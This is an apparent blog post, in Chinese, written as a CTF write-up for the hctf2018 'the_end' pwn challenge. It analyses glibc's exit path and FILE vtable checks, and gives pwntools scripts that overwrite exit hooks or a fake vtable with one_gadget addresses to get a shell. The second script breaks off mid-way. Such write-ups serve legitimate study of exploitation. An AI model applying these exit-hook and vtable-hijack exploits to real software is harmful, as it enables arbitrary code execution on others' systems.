@@ -1,0 +1,786 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":false,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="hctf2018_the_end远程：2.27-3ubuntu1  每次往一个地址里面写1字节，给了libc _dl_rtld_unlock_recursive&#x2F;_dl_rtld_lock_recursive往libc中写入数据，通过exit退出，打exithook，用one_gadget来获取shell 我们劫持ld中rtld_global结构体的_dl_rtld_unlock_rec">
+<meta property="og:type" content="article">
+<meta property="og:title" content="the_end">
+<meta property="og:url" content="http://example.com/2024/06/10/the-end/index.html">
+<meta property="og:site_name" content="tw11ty">
+<meta property="og:description" content="hctf2018_the_end远程：2.27-3ubuntu1  每次往一个地址里面写1字节，给了libc _dl_rtld_unlock_recursive&#x2F;_dl_rtld_lock_recursive往libc中写入数据，通过exit退出，打exithook，用one_gadget来获取shell 我们劫持ld中rtld_global结构体的_dl_rtld_unlock_rec">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406091758971.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406101735021.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406102038387.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406102110358.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406111243066.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406111246252.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406111249308.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406111301650.png">
+<meta property="article:published_time" content="2024-06-10T13:21:59.000Z">
+<meta property="article:modified_time" content="2024-06-11T05:38:50.387Z">
+<meta property="article:author" content="kkkk">
+<meta property="article:tag" content="exit &amp; IO">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406091758971.png">
+
+
+<link rel="canonical" href="http://example.com/2024/06/10/the-end/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2024/06/10/the-end/","path":"2024/06/10/the-end/","title":"the_end"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>the_end | tw11ty</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="tw11ty" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">tw11ty</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">A blog powered by Hexo</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#hctf2018-the-end"><span class="nav-number">1.</span> <span class="nav-text">hctf2018_the_end</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#dl-rtld-unlock-recursive-dl-rtld-lock-recursive"><span class="nav-number">1.1.</span> <span class="nav-text">_dl_rtld_unlock_recursive&#x2F;_dl_rtld_lock_recursive</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fini-array"><span class="nav-number">1.2.</span> <span class="nav-text">fini_array</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IO-flush-all-lockp-IO-unbuffer-all"><span class="nav-number">1.3.</span> <span class="nav-text">_IO_flush_all_lockp&#x2F;  _IO_unbuffer_all ()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="nav-number">1.4.</span> <span class="nav-text">总结：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%AD%EF%BC%9Aio-str-finish"><span class="nav-number">1.5.</span> <span class="nav-text">续：io_str_finish</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">kkkk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/06/10/the-end/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="kkkk">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="tw11ty">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="the_end | tw11ty">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          the_end
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2024-06-10 21:21:59" itemprop="dateCreated datePublished" datetime="2024-06-10T21:21:59+08:00">2024-06-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-06-11 13:38:50" itemprop="dateModified" datetime="2024-06-11T13:38:50+08:00">2024-06-11</time>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>12k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>11 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="hctf2018-the-end"><a href="#hctf2018-the-end" class="headerlink" title="hctf2018_the_end"></a>hctf2018_the_end</h1><p>远程：2.27-3ubuntu1</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406091758971.png" alt="image-20240609175811827"></p>
+<p>每次往一个地址里面写1字节，给了libc</p>
+<h2 id="dl-rtld-unlock-recursive-dl-rtld-lock-recursive"><a href="#dl-rtld-unlock-recursive-dl-rtld-lock-recursive" class="headerlink" title="_dl_rtld_unlock_recursive&#x2F;_dl_rtld_lock_recursive"></a>_dl_rtld_unlock_recursive&#x2F;_dl_rtld_lock_recursive</h2><p>往libc中写入数据，通过exit退出，打exithook，用one_gadget来获取shell</p>
+<p>我们劫持ld中rtld_global结构体的_dl_rtld_unlock_recursive&#x2F;_dl_rtld_lock_recursive</p>
+<p>最后打的是_dl_rtld_unlock_recursive   _dl_rtld_lock_recursive没通</p>
+<pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span> *
+<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *
+<span class="comment">#from ctypes import *</span>
+
+
+<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :
+    context.log_level = <span class="string">&#x27;info&#x27;</span>
+    IPort = <span class="string">&#x27;node5.buuoj.cn 28004&#x27;</span>
+    pwnfile = <span class="string">&#x27;./the_end&#x27;</span>
+    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;</span> 
+    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>
+    elf  = ELF(pwnfile)
+    rop  = ROP(pwnfile)
+    libc = ELF(libc_name)
+
+    io = init(pwnfile, IPort, libc_name)
+
+    ru(<span class="string">b&#x27;0x&#x27;</span>)
+    libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;sleep&#x27;</span>]
+
+    one_gadget = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>, <span class="number">0xe569f</span>, <span class="number">0xe5858</span>, <span class="number">0xe585f</span>, <span class="number">0xe5863</span>, <span class="number">0x10a398</span>]
+    one = libc_base + one_gadget[<span class="number">7</span>]
+    ori0 = one & <span class="number">0xff</span>
+    ori1 = one>><span class="number">8</span> & <span class="number">0xff</span>
+    ori2 = one>><span class="number">16</span> & <span class="number">0xff</span>
+    ori3 = one>><span class="number">24</span> & <span class="number">0xff</span>
+    ori4 = one>><span class="number">32</span> & <span class="number">0xff</span>
+    leak(<span class="string">"one_gadget"</span>, one)
+    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori0))
+    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori1))
+    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori2))
+    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori3))
+    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori4))
+
+    IO_file_overflow = <span class="number">0x3e82b8</span> + libc_base
+    IO_file_underflow = <span class="number">0x3e82c0</span> + libc_base
+    dl_rtld_lock_recursive = <span class="number">0x619f60</span> + libc_base
+    dl_rtld_unlock_recursive  = <span class="number">0x619f68</span> + libc_base
+    leak(<span class="string">"IO_file_overflow"</span>, IO_file_overflow)
+    ru(<span class="string">b&#x27; good luck ;)\n&#x27;</span>)
+    <span class="comment"># debug()</span>
+
+    s(p64(dl_rtld_unlock_recursive))
+    s(p8(ori0))
+    s(p64(dl_rtld_unlock_recursive+<span class="number">1</span>))
+    s(p8(ori1))
+    s(p64(dl_rtld_unlock_recursive+<span class="number">2</span>))
+    s(p8(ori2))
+    s(p64(dl_rtld_unlock_recursive+<span class="number">3</span>))
+    s(p8(ori3))
+    s(p64(dl_rtld_unlock_recursive+<span class="number">4</span>))
+    s(p8(ori4))
+
+    itr()
+</code></pre>
+
+
+
+
+
+<h2 id="fini-array"><a href="#fini-array" class="headerlink" title="fini_array"></a>fini_array</h2><p>如果没开pie和RELRO的话直接改fini_array为one_gadget打了，不过这种题目很少了</p>
+<h2 id="IO-flush-all-lockp-IO-unbuffer-all"><a href="#IO-flush-all-lockp-IO-unbuffer-all" class="headerlink" title="_IO_flush_all_lockp&#x2F;  _IO_unbuffer_all ()"></a>_IO_flush_all_lockp&#x2F;  _IO_unbuffer_all ()</h2><p>我们分析一下exit的调用链</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406101735021.png" alt="image-20240610173504887"></p>
+<p>正常调用链：exit –&gt; __run_exit_handlers  –&gt; _exit -&gt; INLINE_SYSCALL </p>
+<p>在调用__run_exit_handlers  时，会触发   RUN_HOOK (__libc_atexit, ()); 调用libc退出时的析构函数__libc_atexit，位于__libc_atexit段上，里面默认只有一个函数fcloseall()</p>
+<pre class=" language-highlight assembly"><code class="language-highlight assembly">__libc_atexit:00000000003E7738 ; ===========================================================================
+__libc_atexit:00000000003E7738
+__libc_atexit:00000000003E7738 ; Segment type: Pure data
+__libc_atexit:00000000003E7738 ; Segment permissions: Read/Write
+__libc_atexit:00000000003E7738 __libc_atexit   segment qword public &#x27;DATA&#x27; use64
+__libc_atexit:00000000003E7738                 assume cs:__libc_atexit
+__libc_atexit:00000000003E7738                 ;org 3E7738h
+__libc_atexit:00000000003E7738 off_3E7738      dq offset fcloseall_0   ; DATA XREF: sub_42ED0+202↑o
+__libc_atexit:00000000003E7738                                         ; __libc_freeres+28↑o
+__libc_atexit:00000000003E7738 __libc_atexit   ends
+__libc_atexit:00000000003E7738</code></pre>
+
+<p>fcloseall.c</p>
+<pre class=" language-highlight c"><span class="type"><code class="language-highlight c"><span class="type">int</span>
+__fcloseall (<span class="type">void</span>)
+&#123;
+  <span class="comment">/* Close all streams.  */</span>
+  <span class="keyword">return</span> _IO_cleanup ();
+&#125;</code></pre>
+
+<p>genops.c</p>
+<pre class=" language-highlight c"><span class="type"><code class="language-highlight c"><span class="type">int</span>
+_IO_cleanup (<span class="type">void</span>)
+&#123;
+  <span class="comment">/* 刷新所有流 */</span>
+  <span class="type">int</span> result = _IO_flush_all_lockp (<span class="number">0</span>);
+
+  <span class="comment">/* 关闭所有流的缓冲区 */</span>
+  _IO_unbuffer_all ();
+
+  <span class="keyword">return</span> result;
+&#125;</code></pre>
+
+<pre class=" language-highlight c"><span class="type"><code class="language-highlight c"><span class="type">int</span>
+_IO_flush_all_lockp (<span class="type">int</span> do_lock)
+&#123;
+  <span class="type">int</span> result = <span class="number">0</span>;
+  FILE *fp;
+
+<span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span>
+  _IO_cleanup_region_start_noarg (flush_cleanup);
+  _IO_lock_lock (list_all_lock);
+<span class="meta">#<span class="keyword">endif</span></span>
+
+  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp->_chain)
+    &#123;
+      run_fp = fp;
+      <span class="keyword">if</span> (do_lock)
+	_IO_flockfile (fp);
+
+      <span class="keyword">if</span> (((fp->_mode <= <span class="number">0</span> && fp->_IO_write_ptr > fp->_IO_write_base)
+	   || (_IO_vtable_offset (fp) == <span class="number">0</span>
+	       && fp->_mode > <span class="number">0</span> && (fp->_wide_data->_IO_write_ptr
+				    > fp->_wide_data->_IO_write_base))
+	   )
+	  && _IO_OVERFLOW (fp, EOF) == EOF)   <span class="comment">// --> target</span>
+	result = EOF;
+
+      <span class="keyword">if</span> (do_lock)
+	_IO_funlockfile (fp);
+      run_fp = <span class="literal">NULL</span>;
+    &#125;
+
+<span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span>
+  _IO_lock_unlock (list_all_lock);
+  _IO_cleanup_region_end (<span class="number">0</span>);
+<span class="meta">#<span class="keyword">endif</span></span>
+
+  <span class="keyword">return</span> result;
+&#125;
+</code></pre>
+
+<pre class=" language-highlight c"><span class="type">static</span> <span class="type"><code class="language-highlight c"><span class="type">static</span> <span class="type">void</span>
+_IO_unbuffer_all (<span class="type">void</span>)
+&#123;
+  FILE *fp;
+
+<span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span>
+  _IO_cleanup_region_start_noarg (flush_cleanup);
+  _IO_lock_lock (list_all_lock);
+<span class="meta">#<span class="keyword">endif</span></span>
+
+  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp; fp = fp->_chain)
+    &#123;
+      <span class="type">int</span> legacy = <span class="number">0</span>;
+
+<span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span>
+      <span class="keyword">if</span> (__glibc_unlikely (_IO_vtable_offset (fp) != <span class="number">0</span>))
+	legacy = <span class="number">1</span>;
+<span class="meta">#<span class="keyword">endif</span></span>
+
+      <span class="keyword">if</span> (! (fp->_flags & _IO_UNBUFFERED)
+	  <span class="comment">/* Iff stream is un-orientated, it wasn&#x27;t used. */</span>
+	  && (legacy || fp->_mode != <span class="number">0</span>))
+	&#123;
+<span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span>
+	  <span class="type">int</span> cnt;
+<span class="meta">#<span class="keyword">define</span> MAXTRIES 2</span>
+	  <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt < MAXTRIES; ++cnt)
+	    <span class="keyword">if</span> (fp->_lock == <span class="literal">NULL</span> || _IO_lock_trylock (*fp->_lock) == <span class="number">0</span>)
+	      <span class="keyword">break</span>;
+	    <span class="keyword">else</span>
+	      <span class="comment">/* Give the other thread time to finish up its use of the</span>
+<span class="comment">		 stream.  */</span>
+	      __sched_yield ();
+<span class="meta">#<span class="keyword">endif</span></span>
+
+	  <span class="keyword">if</span> (! legacy && ! dealloc_buffers && !(fp->_flags & _IO_USER_BUF))
+	    &#123;
+	      fp->_flags |= _IO_USER_BUF;
+
+	      fp->_freeres_list = freeres_list;
+	      freeres_list = fp;
+	      fp->_freeres_buf = fp->_IO_buf_base;
+	    &#125;
+
+	  _IO_SETBUF (fp, <span class="literal">NULL</span>, <span class="number">0</span>);   <span class="comment">// --> target</span>
+
+	  <span class="keyword">if</span> (! legacy && fp->_mode > <span class="number">0</span>)
+	    _IO_wsetb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);
+
+<span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span>
+	  <span class="keyword">if</span> (cnt < MAXTRIES && fp->_lock != <span class="literal">NULL</span>)
+	    _IO_lock_unlock (*fp->_lock);
+<span class="meta">#<span class="keyword">endif</span></span>
+	&#125;
+
+      <span class="comment">/* Make sure that never again the wide char functions can be</span>
+<span class="comment">	 used.  */</span>
+      <span class="keyword">if</span> (! legacy)
+	fp->_mode = <span class="number">-1</span>;
+    &#125;
+
+<span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span>
+  _IO_lock_unlock (list_all_lock);
+  _IO_cleanup_region_end (<span class="number">0</span>);
+<span class="meta">#<span class="keyword">endif</span></span>
+&#125;
+</code></pre>
+
+<p>利用__IO_cleanup时，可利用的函数有_IO_flush_all_lockp与_IO_unbuffer_all</p>
+<p>其中可以伪造_IO_flush_all_lockp中的_IO_overflow，伪造_IO_unbuffer_all中的_IO_setbufk</p>
+<p>那么首先我们需要伪造*vtable指向一个可写地址</p>
+<p>由于libc版本&gt;2.24，存在_IO_vtable_check</p>
+<p>_IO_vtable_check   libioP.h</p>
+<pre class=" language-highlight c"><span class="comment"><code class="language-highlight c"><span class="comment">/* Check if unknown vtable pointers are permitted; otherwise,</span>
+<span class="comment">   terminate the process.  */</span>
+<span class="type">void</span> _IO_vtable_check (<span class="type">void</span>) attribute_hidden;
+
+<span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span>
+<span class="comment">   the process.  */</span>
+<span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *
+<span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span>
+&#123;
+  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span>
+<span class="comment">     section.  */</span>
+  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
+  <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;
+  <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;
+  <span class="keyword">if</span> (__glibc_unlikely (offset >= section_length))
+    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span>
+<span class="comment">       slow path, which will terminate the process if necessary.  */</span>
+    _IO_vtable_check ();
+  <span class="keyword">return</span> vtable;</code></pre>
+
+<p>我们需要绕过if (__glibc_unlikely (offset &gt;&#x3D; section_length))的check，就需要  ptr - __start___libc_IO_vtables &gt;&#x3D; __stop___libc_IO_vtables - __start___libc_IO_vtables，即ptr要在__start___libc_IO_vtables到__stop___libc_IO_vtables之间（该范围被设置为了不可写）</p>
+<p>那我们尝试打<strong>io_str_finish</strong></p>
+<p>调用链子： __run_exit_handlers  –&gt; __fcloseall  –&gt;  _IO_cleanup –&gt; _IO_flush_all_lockp –&gt; _IO_OVERFLOW（_IO_finish_t）</p>
+<p>先用两次修改次数，来将stdout.vtable指向&amp;_IO_str_jumps-8，这样exit在调用_IO_flush_all_lockp时会执行_IO_str_finish，而不是_IO_overflow</p>
+<p>修改((_IO_strfile *) fp)-&gt;_s._free_buffer 为 one_gadget 地址， 触发程序执行 _IO_str_finish函数就可以得到 shell，但是由于存在绕过的要求，不够写</p>
+<pre class=" language-highlight c"><span class="type"><code class="language-highlight c"><span class="type">void</span>
+_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)
+&#123;
+  <span class="keyword">if</span> (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
+    (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);
+  fp->_IO_buf_base = <span class="literal">NULL</span>;
+
+  _IO_default_finish (fp, <span class="number">0</span>);
+&#125;</code></pre>
+
+<p>绕过：</p>
+<blockquote>
+<p>要满足 fp-&gt;_IO_buf_base 不为空，并且由于它作为 fp-&gt;_s._free_buffer 的第一个参数，因此可以使用 &#x2F;bin&#x2F;sh 的地址。<br>fp-&gt;_flags 要不包含_IO_USER_BUF，它的定义为 #define _IO_USER_BUF 1，即 fp-&gt;_flags 最低位为 0 。<br>缓冲区需要有数据，即 _IO_write_base &lt; _IO_write_ptr 。<br>_mode 需要小于等于 0 。</p>
+<p>_flags &amp;&#x3D; -1</p>
+<p>_IO_write_base &lt; _IO_write_ptr</p>
+<p>*vtable &#x3D; &amp;_IO_str_jumps - 0x8  </p>
+<p>_free_buffer &#x3D; one_gadget</p>
+</blockquote>
+<p>_IO_write_ptr 需要写一次，*vtable &#x3D; &amp;_IO_str_jumps - 0x8  需要写两次，_free_buffer &#x3D; one_gadget需要改三次，行不通</p>
+<p>如果能有六次写的机会的话，就能打_IO_flush_all_lockp</p>
+<p>改另一条链子 __run_exit_handlers  –&gt; __fcloseall  –&gt;  _IO_cleanup –&gt; _IO_unbuffer_all –&gt; _IO_setbuf，下面这个博客所示方法</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ad0b895e5a86">2018 HCTF the_end - 简书 (jianshu.com)</a></p>
+<p>由于原题是2.23的，所以能任意伪造vtable地址到任意地址</p>
+<ul>
+<li><p>利用的是在程序调用 <code>exit</code> 后，会遍历<code>_IO_list_all</code>,调用<code>_IO_2_1_stdout_</code>下的<code>vatable</code>中<code>_setbuf</code>函数.</p>
+</li>
+<li><p>可以先修改两个字节在当前<code>vtable</code>附近伪造一个<code>fake_vtable</code>，然后使用 3 个字节修改<code>fake_vtable</code>中<code>_setbuf</code>的内容为<code>one_gadget</code>.</p>
+</li>
+</ul>
+<p>本地patch 2.23</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406102038387.png" alt="image-20240610203831160"></p>
+<p>将vtable迁移到可写段上，我们可以改 _IO_OVERFLOW\_IO_SETBUF为one_gadget，最后执行链子1\2获取shell</p>
+<p>设置目标作为_IO_OVERFLOW\_IO_SETBUF，通过偏移函数在虚表中的偏移来计算得到fake_vtable_addr</p>
+<p>打_IO_SETBUF，成功执行到one_gadget了，但是栈的问题没有执行，试了几个都没用</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406102110358.png" alt="image-20240610211016997"></p>
+<pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span> *
+<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *
+<span class="comment">#from ctypes import *</span>
+
+<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :
+    context.log_level = <span class="string">&#x27;info&#x27;</span>
+    IPort = <span class="string">&#x27;node5.buuoj.cn 28004&#x27;</span>
+    pwnfile = <span class="string">&#x27;./the_end&#x27;</span>
+    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span> 
+    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>
+    elf  = ELF(pwnfile)
+    rop  = ROP(pwnfile)
+    libc = ELF(libc_name)
+
+    io = init(pwnfile, IPort, libc_name)
+
+    ru(<span class="string">b&#x27;0x&#x27;</span>)
+    libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;sleep&#x27;</span>]
+
+    <span class="comment"># one_gadget = [0x4f2c5, 0x4f322, 0x10a38c, 0xe569f, 0xe5858, 0xe585f, 0xe5863, 0x10a398]</span>
+    one_gadget = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>, <span class="number">0xcd173</span>, <span class="number">0xcd248</span>, <span class="number">0xf03a4</span>, <span class="number">0xf03b0</span>, <span class="number">0xf1247</span>, <span class="number">0xf67f0</span>]
+    one = libc_base + one_gadget[<span class="number">0</span>]
+    ori0 = one & <span class="number">0xff</span>
+    ori1 = one>><span class="number">8</span> & <span class="number">0xff</span>
+    ori2 = one>><span class="number">16</span> & <span class="number">0xff</span>
+    ori3 = one>><span class="number">24</span> & <span class="number">0xff</span>
+    ori4 = one>><span class="number">32</span> & <span class="number">0xff</span>
+    leak(<span class="string">"one_gadget"</span>, one)
+    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori0))
+    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori1))
+    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori2))
+    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori3))
+    <span class="built_in">print</span>(<span class="built_in">hex</span>(ori4))
+
+    stdout_vtable = libc_base + <span class="number">0x3c56f8</span>    <span class="comment">#-->fake_vtable</span>
+    fake_vtable_addr = libc_base + <span class="number">0x3c5588</span>  <span class="comment">#fake_vtable->0x58 =  _IO_setbuf_t</span>
+    setbuf = libc_base + <span class="number">0x3c55e0</span>         
+    
+    leak(<span class="string">"stdout_vtable"</span>, stdout_vtable)
+    leak(<span class="string">"fake_vtable"</span>, fake_vtable_addr)
+
+        
+    debug(<span class="string">"b _IO_flush_all_lockp"</span>)
+    s(p64(stdout_vtable))
+    s(p8(fake_vtable_addr&<span class="number">0xff</span>))
+    s(p64(stdout_vtable+<span class="number">1</span>))
+    s(p8(fake_vtable_addr>><span class="number">8</span>&<span class="number">0xff</span>))
+
